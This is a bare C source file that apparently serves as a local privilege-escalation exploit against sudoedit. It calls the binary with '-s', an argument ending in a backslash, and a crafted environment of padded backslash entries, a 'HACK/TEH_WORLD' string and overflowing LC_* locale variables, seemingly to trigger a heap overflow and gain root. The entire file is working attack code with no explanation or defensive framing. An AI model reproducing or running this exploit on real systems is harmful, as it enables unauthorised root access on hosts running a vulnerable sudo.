#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[], char *envp[])
{
    char *args[] =
    {
        "/usr/local/bin/sudoedit",
        "-A",
        "-s",
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\",
        NULL
    };

    char *env[] = {
    "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ\\",
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "A/AAAAA\\",
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "B/BBBBB\\",
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "C/CCCCC\\",
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "D/DDDDD\\",
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "E/EEEEE\\",
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "F/FFFFF\\",
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "G/GGGGG\\",
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "H/HHHHH\\",
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "I/IIIII\\",
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "J/JJJJJ\\",
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "K/KKKKK\\",
    "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "HACK/TEH_WORLD",
    "LC_CTYPE=C.UTF-8@ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ;A=",
    "LC_NUMERIC=C.UTF-8@ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    "LC_TIME=C.UTF-8@ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    "LC_COLLATE=C.UTF-8@ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    "TZ=:",
    NULL
    };
    execve(args[0], args, env);
}
